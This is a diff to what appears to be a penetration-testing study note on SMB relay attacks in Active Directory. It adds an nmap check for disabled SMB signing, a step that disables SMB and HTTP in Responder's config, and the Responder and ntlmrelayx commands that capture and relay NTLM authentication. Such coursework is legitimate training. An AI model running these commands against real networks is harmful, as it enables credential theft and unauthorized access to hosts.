@@ -23,7 +23,33 @@ instead of cracking the target hashes we captured with responder we can instead 
 	- Con: Potential increase in the amount of service desk tickets 
 
 
+
+
+# nmap check for smb signing disabled
+```bash
+# nmap script to check for smb signing disabled
+nmap --script=smb2-security-mode.nse -p445 IP/RANGE
+```
+
 # Example
 
 
-![[PNPT/AD/Attacking AD/Tools#SMB Relay]]
+disable responding on SMB and HTTP:
+```bash
+/usr/share/responder/Responder.conf # edit turn off smb and http
+```
+
+Run Responder
+```
+sudo Responder -I eth0 -dwv
+```
+
+Run ntlmrelayx:
+```
+sudo ntlmrelayx.py -tf target.txt -smb2support
+```
+
+---
+Tags: #AD #smb #smb_relay #responder #LLMNR 
+
+Resources: [dirkjanm_blog](https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/)
